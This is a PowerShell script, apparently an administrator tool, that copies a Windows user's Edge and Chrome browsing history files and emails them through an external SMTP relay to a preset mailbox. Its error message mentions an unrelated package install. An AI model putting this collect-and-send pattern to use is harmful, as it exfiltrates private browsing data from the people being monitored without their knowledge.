# Define email parameters, I am using Brevo service to send email, please make sure you change settings according to your needs
# This script assumes Brevo (or similar service) is already configured correctly and allows sending emails from specific email addresses, also that the relevant SPF record changes have been configured to allow Brevo sending emails using your chosen domain
$smtpServer = "smtp-relay.brevo.com"
$smtpPort = 587
$smtpUsername = "user@example.com"    # This is the username used to login to Brevo's smtp relay
$smtpPassword = "your password"
$fromAddress = "mailbox@example.com"   
$toAddress = "mailbox@example.com"
$subject = "$Env:USERNAME Browsing history files"
$body = "Attached history file from Edge and Chrome"
$tempFolder = "C:\Admin\HistoryFiles"   #  This is a temp folder where history files will be copied so they can be attached
$attachments = @()

# Create temp folder
New-Item $tempFolder -ItemType Directory -Force

# Define file paths for attachments
$attachment1 = "$Env:systemdrive\Users\$Env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Default\History."  # Path to Edge "History" file
$attachment2 = "$Env:SystemDrive\Users\$Env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\History." # Path to Chrome "History" file

# Attach files if they exist
if (-not (Test-Path -Path $attachment1)) {
    Write-Verbose "[!] Could not find Edge History file for username: $Env:USERNAME"
} else {
    $edgeHistory = $tempFolder + "\EdgeHistory."
    Copy-Item $attachment1 -Destination $edgeHistory -Force -ErrorAction SilentlyContinue
    $attachments += $edgeHistory
}

if (-not (Test-Path -Path $attachment2)) {
    Write-Verbose "[!] Could not find Chrome History file for username: $Env:USERNAME"
} else {
    $chromeHistory = $tempFolder + "\ChromeHistory."
    Copy-Item $attachment2 -Destination $chromeHistory -Force -ErrorAction SilentlyContinue
    $attachments += $chromeHistory
}

# Create a secure string for the password
$securePassword = ConvertTo-SecureString -String $smtpPassword -AsPlainText -Force

# Create a credential object
$credential = New-Object System.Management.Automation.PSCredential($smtpUsername, $securePassword)

# Send the email
try {
	Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -Credential $credential -UseSsl -From $fromAddress -To $toAddress -Subject $subject -Body $body -Attachments $attachments -ErrorAction Stop
    # Print a success message
    Write-Host "Email sent successfully!"
}
catch {
	Throw "Failed to install $Package"
}
exit $LASTEXITCODE    # Returns the value 0 if succeded, and 1 if failed - For reporting purposes only